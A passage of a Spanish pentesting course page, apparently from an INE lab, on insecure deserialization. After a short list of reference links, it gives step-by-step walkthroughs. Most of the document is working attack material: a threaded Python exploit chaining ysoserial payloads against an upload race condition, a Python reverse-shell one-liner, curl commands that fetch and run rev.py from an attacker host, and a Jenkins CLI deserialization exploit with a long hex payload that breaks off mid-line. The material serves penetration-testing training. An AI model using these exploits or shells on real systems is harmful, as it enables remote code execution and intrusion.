```

2º ejercicio - Modificar el hello.aspx.cs

### Otras serializaciones <a href="#other-serialization" id="other-serialization"></a>

Cada lenguaje de desarrollo tiene su propia lógica de deserialización y puntos de entrada/mecanismos de transporte de datos serializados.

* Los lenguajes menos populares darán lugar a una explotación más difícil de las vulnerabilidades de deserialización, ya que no existirán herramientas automatizadas, como ysoserial
* La deserialización de datos que no son de confianza no conduce necesariamente a la ejecución de código

> Es posible que a menudo pueda ver el código completo de una aplicación de destino en el repositorio de github

Cuando busque este problema, preste atención a:

```
- Contains strings that are similar to method names or object names
- Contains Binary data
- Is in a complex, structured form
```

#### Serialización basada en Python <a href="#python-based-serialization" id="python-based-serialization"></a>

```
- https://intoli.com/blog/dangerous-pickles/
- https://lincolnloop.com/blog/playing-pickle-security/
```

#### Deserialización insegura de Ruby <a href="#ruby-insecure-deserialization" id="ruby-insecure-deserialization"></a>

```
- https://blog.rubygems.org/2017/10/09/unsafe-object-deserialization-vulnerability.html
```

#### Presentación genérica sobre todas las tecnologías mencionadas <a href="#generic-presentation-about-all-mentioned-technologies" id="generic-presentation-about-all-mentioned-technologies"></a>

```
- https://insomniasec.com/downloads/publications/Deserialization%20-%20%20What%20Could%20Go%20Wrong.pdf
```

#### Ejemplos en Snake YAML <a href="#examples-in-snake-yaml" id="examples-in-snake-yaml"></a>

```
- https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858
- https://blog.semmle.com/swagger-yaml-parser-vulnerability/
```

### Laboratorio 1 <a href="#lab-1" id="lab-1"></a>

#### Tarea 1. Realice un reconocimiento e identifique una aplicación web vulnerable <a href="#task-1-perform-reconnaissance-and-identify-a-vulnerable-web-application" id="task-1-perform-reconnaissance-and-identify-a-vulnerable-web-application"></a>

Paso 1: Inicie el laboratorio. Espere hasta que el laboratorio esté listo. Una vez que el laboratorio esté listo, la interfaz de Kali Linux estará disponible en el navegador.

Paso 2: Escanee la red con Nmap y recopile la información sobre la máquina de destino.

Utilice el siguiente comando para obtener información sobre los puertos y servicios abiertos en la red.

Mandar:

```

nmap demo.ine.local
```

Obtuvo la información sobre la dirección IP y los puertos que están abiertos en la máquina de destino.

Paso 3: Utilice Dirb para enumerar los directorios del sitio web alojado en el servidor.

```
DIRB is a command-line-based tool to brute force any directory based on wordlists.

Command:

dirb http://demo.ine.local/ /usr/share/dirb/wordlists/common.txt
```

Tarea 2. Identificar condiciones explotables

Paso 1: Navega hasta la URL de destino.

```
Target URL:
http://demo.ine.local/upload/
```

Paso 2: Al ingresar a la página y proporcione un parámetro "index.php?sent=OK" al final de la URL.

```
The application tries to read a file named "data.ser" but throws a Java-related exception.
```

Paso 3: Crea un archivo de muestra con el siguiente comando.

Mandar:

```
echo "sample text" > example.txt
```

Paso 4: Navega a la página de carga. La página de carga permite cargar un archivo en una ubicación desconocida.

> \[Nota] Hay un breve retraso antes de que se cargue el archivo, lo que puede significar que está siendo procesado por una especie de lógica de back-end. Abra dos pestañas en una página con sent=ok al final y la página de carga.

```
Select the example.txt and click upload then quickly switch the tabs.
```

Paso 5: Cargue el archivo usando la página de carga e intente leer el archivo.

```
- The application moves away from any uploaded files once they are processed. To be able to read them on time, one should click the "Read the file" button before the upload message is displayed.

- Now if the "OK" button at "Read the file" is clicked quickly enough (it is best to have it in a separate tab) then the error message changes indicating, that possibly, the file content was deserialized unsuccessfully due to a corrupted format.

- It looks like we have identified an untrusted data deserialization vulnerability, which can only be exploited when the payload file is timely delivered to the application.
```

Tarea 3. Lograr la ejecución de código

Para crear un exploit, necesitaremos tres cosas:

```
1. Ysoserial payloads to try, as we do not know which exactly will work
2. A loop that will constantly try to upload and then read the file
3. A check to identify whether code execution was achieved or not
```

Paso 1: Como tenemos tantas cargas útiles en las herramientas ysoseriales, crearemos un bucle con diferentes cargas útiles que intentarán cargar constantemente y luego leer el archivo.

Para obtener una lista de cargas útiles ysoseriales, una de las formas puede ser copiar la salida de ysoserial en un archivo, nuestro se llama yso.

Mandar:

```
java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar >yso  2>&1
cat yso | tr -d ' ' | cut -d "@" -f 1 > payloads.txt
sed -i -e '1,7d'  payloads.txt
```

Estos comandos guardarán la carga útil en el archivo yso y le darán formato para hacer una lista de cargas útiles de la herramienta ysoserial y finalmente la guardarán como payloads.txt.

Mandar:

```
cat payloads.txt
```

El resultado será similar a este.

Paso 2: Genere una carga útil para cada línea de la lista antes mencionada.

> \[Nota] Vamos a hacer ping a la IP de la máquina atacante, no a la máquina objetivo.

Cambie el directorio a home para que podamos enumerar todas las cargas útiles fácilmente aquí.

Mandar:

```
cd /home
```

Utilice el siguiente comando para generar cargas útiles.

Mandar:

```
while read payloadname; do java -jar ../root/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar $payloadname "ping 192.91.247.2 -c 3" > $payloadname; done < payloads.txt
```

El resultado será similar.

Paso 3: Construya un exploit en Python que imite el uso del sitio web.

Tendrá que tomar una lista de cargas útiles (las tenemos por nombre, en breve convertiremos la lista en una lista de nombres de archivo). Además, el exploit tendrá que emitir dos solicitudes una tras otra: la de "carga" e inmediatamente después la de "leer archivo".

En los siguientes ejemplos, estamos usando Python 3. Tenga en cuenta que estamos accediendo al sitio web de la máquina de destino, por lo que debemos usar esa dirección IP.

La solicitud de "leer archivo" puede tener un aspecto similar al que se muestra a continuación.

```
def readfile(filename):
  url = "http://demo.ine.local/upload/index.php?sent=OK"
  r = requests.get(url)
  print("[+] Used filename: " + filename)
  print(r.text)
  print("\n")
```

Entonces, la solicitud "upload\_file" puede ser similar a la siguiente.

```
def upload(filename):
  url = "http://demo.ine.local/upload/upload.php"
  files ={'uploaded_file': open(filename, 'rb')}
  r = requests.post(url, files=files)
```

Paso 4: También necesitaremos una lista de todos los archivos de carga útil por su nombre. Dado que cada archivo lleva el nombre de la carga útil, podemos usar el archivo "yso" nuevamente para generar una lista (ya que no queremos volver a escribirlo manualmente).

```
while read payload; do /root/payloads.txt echo \'$payload\', >> /root/p2.txt; done < /root/payloads.txt
```

El resultado será similar.

La lista se puede pegar directamente en un programa de Python (la última coma después de la última carga útil debe eliminarse)

Para ejecutarlos secuencialmente y luego usar "leer archivo" inmediatamente, necesitamos implementar el concepto de subprocesos. Si simplemente ejecutamos las dos funciones anteriores una tras otra, readfile() esperará a upload() hasta que termine. En este momento, el archivo de destino habrá desaparecido.

El subproceso simplemente iniciará upload() en otro hilo, lo que permitirá que readfile() se ejecute sin esperar la respuesta de upload().

```
for payload in payloads:
  x=threading.Thread(target=upload, args=(payload,))
  x.start()
  readfile()
  time.sleep(2)
```

Antes de ejecutar el exploit, compruebe si ha iniciado un agente de escucha para detectar pings, por ejemplo, Wireshark o tcpdump.

Mandar:

```
tcpdump -i eth1 icmp
```

Paso 5: Copia y pega el código y guárdalo como exploit.py. Ahora podemos borrar la lista en el exploit, por lo que su forma final será similar a la siguiente.

```
import requests
import time
import threading
def readfile(filename):
  url = "http://demo.ine.local/upload/index.php?sent=OK"
  r = requests.get(url)
  print("[+] Used filename: " + filename)
  print(r.text)
  print("\n")
def upload(filename):
  url = "http://demo.ine.local/upload/upload.php"
  files ={'uploaded_file': open(filename, 'rb')}
  r = requests.post(url, files=files)
payloads = [
'CommonsCollections2'
]

for payload in payloads:
  x=threading.Thread(target=upload, args=(payload,))
  x.start()
  readfile(payload)
  time.sleep(2)
```

Paso 6: Ejecute el código del exploit mediante el siguiente comando.

Mandar:

```
python exploit.py
```

¡El resultado es la ejecución del código!

Después de un breve rato, mientras vemos diferentes respuestas para cada carga útil, podemos ver que cuando se usa CommonsCollections2, comienzan a aparecer pings.

Tarea 4. Obtener un caparazón inverso

Para establecer un shell inverso necesitaremos emitir un comando o una serie de comandos. Tenga en cuenta que en la deserialización de Java, puede usar espacios en los comandos, pero no puede usar espacios en los argumentos de los comandos.

Paso 1: Cree un script de shell para obtener el shell inverso de la máquina de destino.

Guarde este código como rev.py en el directorio raíz.

Código:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.46.20.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Paso 2: A continuación, alojemos lo anterior utilizando el módulo SimpleHTTPServer de Python en el directorio donde rev está presente.

Mandar:

```
python -m SimpleHTTServer 8443
```

Paso 3: En otra ventana de terminal, inicia un oyente de Netcat.

Mandar:

```
nc -lvp 443
```

Paso 4: Finalmente, el exploit se cambia para generar las cargas útiles respectivas una tras otra.

* Descargar el shell inverso
* Hazlo ejecutable
* Iniciar el shell

```
payload = 'CommonsCollections2'
commands = [
'"curl http://192.91.247.2:8443/rev.py -O rev.py"',
'"chmod +x rev.py"',
'"./rev.py"'
]

for command in commands:
  os.system("java -jar /root/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar " + payload + " " + command + " > " + payload)
  x=threading.Thread(target=upload, args=(payload,))
  x.start()
  readfile(payload)
  time.sleep(2)
```

A continuación puedes encontrar el código completo del exploit.

Guárdelo como exploit.py y ejecute el archivo.

Mandar:

```
python exploit.py
```

Código:

```
import requests
import time
import threading
import os
def readfile(filename):
  url = "http://demo.ine.local/upload/index.php?sent=OK"
  r = requests.get(url)
  print("[+] Used filename: " + filename)
  print(r.text)
  print("\n")

def upload(filename):
  url = "http://demo.ine.local/upload/upload.php"
  files ={'uploaded_file': open(filename, 'rb')}
  r = requests.post(url, files=files)
payload = 'CommonsCollections2'
commands = [
'"curl http://192.91.247.2:8443/rev.py -O rev.py"',
'"chmod +x rev.py"',
'"./rev.py"'
]

for command in commands:
  os.system("java -jar /root/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar " + payload + " " + command + " > " + payload)
  x=threading.Thread(target=upload, args=(payload,))
  x.start()
  readfile(payload)
  time.sleep(2) 
```

> Ejecución remota de código lograda con éxito.

### Laboratorio 2

Solución

Paso 1: Inicie el laboratorio. Espere hasta que el laboratorio esté listo. Una vez que el laboratorio esté listo, la interfaz de Kali Linux estará disponible en el navegador.

Paso 2: Escanee la red con Nmap y recopile la información sobre la máquina de destino.

Utilice el siguiente comando para obtener información sobre los puertos y servicios abiertos en la red.

Mandar:

```
nmap demo.ine.local
```

Obtuvo la información sobre la dirección IP y los puertos que están abiertos en la máquina de destino.

Paso 3: Inspeccione la aplicación Jenkins navegando hasta la dirección IP en el puerto 8080 en el navegador web.

URL de destino:

```
http://192.24.161.3:8080/
```

Paso 4: Copia y pega el código del exploit de python y guárdalo como exploit.py.

Fuente: https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py

Código:

```
#!/usr/bin/python
# usage: ./jenkins.py host port /path/to/payload
import socket
import sys
import requests
import base64

host = sys.argv[1]
port = sys.argv[2]

# Query Jenkins over HTTP to find what port the CLI listener is on
r = requests.get('http://' + host + ':' + port)
cli_port = int(r.headers['X-Jenkins-CLI-Port'])

# Open a socket to the CLI port
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (host, cli_port)
print('connecting to %s port %s' % server_address)
sock.connect(server_address)

# Send headers
headers = '\x00\x14\x50\x72\x6f\x74\x6f\x63\x6f\x6c\x3a\x43\x4c\x49\x2d\x63\x6f\x6e\x6e\x65\x63\x74'
print('sending "%s"' % headers)
sock.send(headers)
data = sock.recv(1024)
print >>sys.stderr, 'received "%s"' % data
data = sock.recv(1024)
print >>sys.stderr, 'received "%s"' % data

payloadObj = open(sys.argv[3], 'rb').read()
payload_b64 = base64.b64encode(payloadObj)
payload='\x3c\x3d\x3d\x3d\x5b\x4a\x45\x4e\x4b\x49\x4e\x53\x20\x52\x45\x4d\x4f\x54\x49\x4e\x47\x20\x43\x41\x50\x41\x43\x49\x54\x59\x5d\x3d\x3d\x3d\x3e'+payload_b64+'\x00\x00\x00\x00\x11\x2d\xac\xed\x00\x05\x73\x72\x00\x1b\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x4c\x00\x10\x63\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x50\x72\x6f\x78\x79\x74\x00\x30\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x3b\x5b\x00\x07\x72\x65\x71\x75\x65\x73\x74\x74\x00\x02\x5b\x42\x4c\x00\x08\x74\x6f\x53\x74\x72\x69\x6e\x67\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x49\x00\x02\x69\x64\x49\x00\x08\x6c\x61\x73\x74\x49\x6f\x49\x64\x4c\x00\x08\x72\x65\x73\x70\x6f\x6e\x73\x65\x74\x00\x1a\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x73\x70\x6f\x6e\x73\x65\x3b\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x09\x63\x72\x65\x61\x74\x65\x64\x41\x74\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x3b\x78\x70\x73\x72\x00\x1e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x24\x53\x6f\x75\x72\x63\x65\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x06\x74\x68\x69\x73\x24\x30\x74\x00\x19\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x43\x6f\x6d\x6d\x61\x6e\x64\x3b\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\xd0\xfd\x1f\x3e\x1a\x3b\x1c\xc4\x02\x00\x00\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\xd5\xc6\x35\x27\x39\x77\xb8\xcb\x03\x00\x04\x4c\x00\x05\x63\x61\x75\x73\x65\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\x3b\x4c\x00\x0d\x64\x65\x74\x61\x69\x6c\x4d\x65\x73\x73\x61\x67\x65\x71\x00\x7e\x00\x03\x5b\x00\x0a\x73\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x74\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x4c\x00\x14\x73\x75\x70\x70\x72\x65\x73\x73\x65\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x74\x00\x10\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x3b\x78\x70\x71\x00\x7e\x00\x10\x70\x75\x72\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x02\x46\x2a\x3c\x3c\xfd\x22\x39\x02\x00\x00\x78\x70\x00\x00\x00\x0c\x73\x72\x00\x1b\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x61\x09\xc5\x9a\x26\x36\xdd\x85\x02\x00\x04\x49\x00\x0a\x6c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x4c\x00\x0e\x64\x65\x63\x6c\x61\x72\x69\x6e\x67\x43\x6c\x61\x73\x73\x71\x00\x7e\x00\x03\x4c\x00\x08\x66\x69\x6c\x65\x4e\x61\x6d\x65\x71\x00\x7e\x00\x03\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x71\x00\x7e\x00\x03\x78\x70\x00\x00\x00\x43\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x74\x00\x0c\x43\x6f\x6d\x6d\x61\x6e\x64\x2e\x6a\x61\x76\x61\x74\x00\x06\x3c\x69\x6e\x69\x74\x3e\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x32\x71\x00\x7e\x00\x15\x71\x00\x7e\x00\x16\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x63\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x74\x00\x0c\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x3c\x74\x00\x1b\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x74\x00\x10\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x03\x08\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x68\x61\x6e\x6e\x65\x6c\x74\x00\x0c\x43\x68\x61\x6e\x6e\x65\x6c\x2e\x6a\x61\x76\x61\x74\x00\x04\x63\x61\x6c\x6c\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xfa\x74\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x74\x00\x1c\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x2e\x6a\x61\x76\x61\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x24\x50\x72\x6f\x78\x79\x31\x70\x74\x00\x0f\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x74\x00\x15\x77\x61\x69\x74\x46\x6f\x72\x52\x65\x6d\x6f\x74\x65\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x74\x00\x0e\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x74\x00\x08\x43\x4c\x49\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x74\x00\x1f\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x74\x00\x19\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x2e\x6a\x61\x76\x61\x74\x00\x07\x63\x6f\x6e\x6e\x65\x63\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x74\x00\x05\x5f\x6d\x61\x69\x6e\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x74\x00\x04\x6d\x61\x69\x6e\x73\x72\x00\x26\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x4c\x69\x73\x74\xfc\x0f\x25\x31\xb5\xec\x8e\x10\x02\x00\x01\x4c\x00\x04\x6c\x69\x73\x74\x71\x00\x7e\x00\x0f\x78\x72\x00\x2c\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x19\x42\x00\x80\xcb\x5e\xf7\x1e\x02\x00\x01\x4c\x00\x01\x63\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x3b\x78\x70\x73\x72\x00\x13\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x41\x72\x72\x61\x79\x4c\x69\x73\x74\x78\x81\xd2\x1d\x99\xc7\x61\x9d\x03\x00\x01\x49\x00\x04\x73\x69\x7a\x65\x78\x70\x00\x00\x00\x00\x77\x04\x00\x00\x00\x00\x78\x71\x00\x7e\x00\x3c\x78\x71\x00\x7e\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x70\x73\x7d\x00\x00\x00\x02\x00\x2e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x00\x1c\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x49\x52\x65\x61\x64\x52\x65\x73\x6f\x6c\x76\x65\x78\x72\x00\x17\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x50\x72\x6f\x78\x79\xe1\x27\xda\x20\xcc\x10\x43\xcb\x02\x00\x01\x4c\x00\x01\x68\x74\x00\x25\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x78\x70\x73\x72\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x00\x00\x00\x00\x00\x00\x00\x01\x03\x00\x05\x5a\x00\x14\x61\x75\x74\x6f\x55\x6e\x65\x78\x70\x6f\x72\x74\x42\x79\x43\x61\x6c\x6c\x65\x72\x5a\x00\x09\x67\x6f\x69\x6e\x67\x48\x6f\x6d\x65\x49\x00\x03\x6f\x69\x64\x5a\x00\x09\x75\x73\x65\x72\x50\x72\x6f\x78\x79\x4c\x00\x06\x6f\x72\x69\x67\x69\x6e\x71\x00\x7e\x00\x0d\x78\x70\x00\x00\x00\x00\x00\x02\x00\x73\x71\x00\x7e\x00\x0b\x71\x00\x7e\x00\x43\x74\x00\x78\x50\x72\x6f\x78\x79\x20\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x40\x32\x20\x77\x61\x73\x20\x63\x72\x65\x61\x74\x65\x64\x20\x66\x6f\x72\x20\x69\x6e\x74\x65\x72\x66\x61\x63\x65\x20\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x75\x71\x00\x7e\x00\x11\x00\x00\x00\x0d\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x7d\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x89\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x74\x00\x04\x77\x72\x61\x70\x73\x71\x00\x7e\x00\x13\x00\x00\x02\x6a\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x74\x00\x06\x65\x78\x70\x6f\x72\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x02\xa6\x74\x00\x21\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x74\x00\x16\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x4a\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x46\x71\x00\x7e\x00\x1d\x71\x00\x7e\x00\x1e\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x03\x08\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x71\x00\x7e\x00\x22\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xfa\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x71\x00\x7e\x00\x26\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x71\x00\x7e\x00\x28\x70\x71\x00\x7e\x00\x29\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x71\x00\x7e\x00\x2b\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x71\x00\x7e\x00\x30\x71\x00\x7e\x00\x31\x71\x00\x7e\x00\x32\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x34\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x36\x71\x00\x7e\x00\x3a\x78\x78\x75\x72\x00\x02\x5b\x42\xac\xf3\x17\xf8\x06\x08\x54\xe0\x02\x00\x00\x78\x70\x00\x00\x07\x46\xac\xed\x00\x05\x73\x72\x00\x32\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x24\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x04\x49\x00\x03\x6f\x69\x64\x5b\x00\x09\x61\x72\x67\x75\x6d\x65\x6e\x74\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x05\x74\x79\x70\x65\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x77\x08\xff\xff\xff\xfe\x00\x00\x00\x02\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x49\x00\x02\x69\x64\x49\x00\x08\x6c\x61\x73\x74\x49\x6f\x49\x64\x4c\x00\x08\x72\x65\x73\x70\x6f